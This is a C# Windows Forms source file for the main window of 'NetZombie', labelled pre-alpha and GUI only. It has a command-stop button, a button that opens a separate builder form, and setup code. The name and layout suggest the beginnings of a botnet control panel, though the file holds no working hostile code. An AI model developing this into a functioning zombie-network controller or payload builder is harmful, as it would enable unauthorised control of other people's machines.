using System;
using System.Windows.Forms;

namespace NetZombie
{
    public partial class frmMain : Form
    {
        frmBuild builder = new frmBuild();

        public frmMain()
        {
            InitializeComponent();
        }

        private void btnCommandStop_Click(object sender, EventArgs e)
        {

        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            this.Icon = Properties.Resources.netzombie;
            this.Text = "NetZombie (Pre-alpha/GUI only)";
        }

        private void btnBuilder_Click(object sender, EventArgs e)
        {
            builder.ShowDialog();
        }

        ~frmMain()
        {
            builder.Close();
            builder.Dispose();
        }
    }
}
